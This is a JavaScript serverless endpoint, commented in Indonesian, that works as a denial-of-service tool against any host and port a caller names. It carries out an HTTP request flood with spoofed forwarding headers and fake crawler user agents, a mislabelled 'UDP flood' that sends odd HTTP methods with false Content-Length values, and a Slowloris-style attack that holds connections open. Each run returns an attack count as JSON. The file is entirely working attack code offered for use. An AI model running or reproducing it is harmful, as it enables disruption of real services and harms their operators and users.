// api/ddos.js - Versi Brutal

export const config = {
  maxDuration: 30, // Maks 30 detik biar ga timeout
};

// Fungsi generate random data
function randomIP() {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function randomString(length) {
  return Math.random().toString(36).substring(2, 2 + length).repeat(100);
}

// HTTP Flood dengan banyak koneksi paralel
async function httpFlood(target, port, duration) {
  const endTime = Date.now() + (duration * 1000);
  let attackCount = 0;
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
  ];
  
  // Gunakan banyak promise paralel
  const promises = [];
  
  while (Date.now() < endTime) {
    // Kirim 50 request sekaligus setiap iterasi
    for (let i = 0; i < 50; i++) {
      const promise = (async () => {
        try {
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), 100);
          
          const url = `http://${target}:${port}/?${randomString(5)}=${randomString(5)}`;
          
          const response = await fetch(url, {
            method: 'GET',
            headers: {
              'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
              'X-Forwarded-For': randomIP(),
              'X-Real-IP': randomIP(),
              'Accept': '*/*',
              'Accept-Language': 'en-US,en;q=0.9',
              'Cache-Control': 'no-cache, no-store, must-revalidate',
              'Pragma': 'no-cache',
              'Connection': 'keep-alive',
            },
            signal: controller.signal
          }).catch(() => null);
          
          clearTimeout(timeout);
          
          if (response) {
            attackCount++;
            response.body?.cancel();
          }
        } catch (e) {
          attackCount++; // Tetap hitung sebagai serangan
        }
      })();
      
      promises.push(promise);
    }
    
    // Jangan tunggu semua selesai
    await Promise.race(promises);
    await new Promise(resolve => setTimeout(resolve, 10));
  }
  
  return attackCount;
}

// UDP Flood simulation dengan banyak koneksi
async function udpFlood(target, port, duration) {
  const endTime = Date.now() + (duration * 1000);
  let attackCount = 0;
  const methods = ['OPTIONS', 'TRACE', 'PATCH', 'DELETE', 'HEAD', 'PROPFIND', 'SEARCH', 'LOCK', 'UNLOCK', 'PURGE'];
  
  while (Date.now() < endTime) {
    // Kirim 30 request sekaligus
    for (let i = 0; i < 30; i++) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 50);
        
        fetch(`http://${target}:${port}`, {
          method: methods[Math.floor(Math.random() * methods.length)],
          headers: {
            'Content-Length': '999999999',
            'X-Forwarded-For': randomIP(),
            'X-Real-IP': randomIP(),
            'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
          },
          signal: controller.signal
        }).catch(() => {
          attackCount++;
        });
        
        clearTimeout(timeout);
      } catch (e) {
        attackCount++;
      }
    }
    
    await new Promise(resolve => setTimeout(resolve, 5));
  }
  
  return attackCount;
}

// Slowloris dengan keep-alive connections
async function slowlorisAttack(target, port, duration) {
  const endTime = Date.now() + (duration * 1000);
  let attackCount = 0;
  const connections = [];
  
  while (Date.now() < endTime && connections.length < 500) {
    try {
      const controller = new AbortController();
      
      // Kirim partial headers
      fetch(`http://${target}:${port}`, {
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'X-Forwarded-For': randomIP(),
          'Content-Length': '1000000000',
          'Connection': 'keep-alive',
          'Keep-Alive': 'timeout=999, max=1000'
        },
        body: randomString(1000),
        signal: controller.signal
      }).catch(() => null);
      
      connections.push(controller);
      attackCount++;
      
      await new Promise(resolve => setTimeout(resolve, 10));
    } catch (e) {
      attackCount++;
    }
  }
  
  return attackCount;
}

export default async function handler(req, res) {
  // Set headers
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).json({});
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    const { target, port, duration, attackType } = body;
    
    if (!target || !port || !duration || !attackType) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    
    // Bersihin target
    let cleanTarget = target.replace(/^https?:\/\//, '').split('/')[0];
    cleanTarget = cleanTarget.split(':')[0];
    
    console.log(`[ATTACK] Starting BRUTAL ${attackType} on ${cleanTarget}:${port} for ${duration}s`);
    
    const startTime = Date.now();
    let attackCount = 0;
    const attackDuration = Math.min(parseInt(duration), 20); // Max 20 detik biar ga timeout
    
    // Pilih serangan berdasarkan tipe
    switch(attackType) {
      case 'http':
        attackCount = await httpFlood(cleanTarget, port, attackDuration);
        break;
      case 'udp':
        attackCount = await udpFlood(cleanTarget, port, attackDuration);
        break;
      case 'slowloris':
        attackCount = await slowlorisAttack(cleanTarget, port, attackDuration);
        break;
      case 'both':
        // Jalankan semua paralel
        const results = await Promise.allSettled([
          httpFlood(cleanTarget, port, attackDuration),
          udpFlood(cleanTarget, port, attackDuration),
          slowlorisAttack(cleanTarget, port, attackDuration)
        ]);
        
        attackCount = results.reduce((sum, r) => 
          sum + (r.status === 'fulfilled' ? r.value : 0), 0);
        break;
      default:
        attackCount = await httpFlood(cleanTarget, port, attackDuration);
    }
    
    const executionTime = (Date.now() - startTime) / 1000;
    
    return res.status(200).json({
      success: true,
      message: `Attack ${attackType.toUpperCase()} completed!`,
      target: cleanTarget,
      port: parseInt(port),
      duration: attackDuration,
      attackType: attackType,
      attackCount: attackCount,
      executionTime: executionTime.toFixed(2),
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Attack error:', error);
    return res.status(500).json({ 
      error: 'Attack failed',
      details: error.message
    });
  }
}
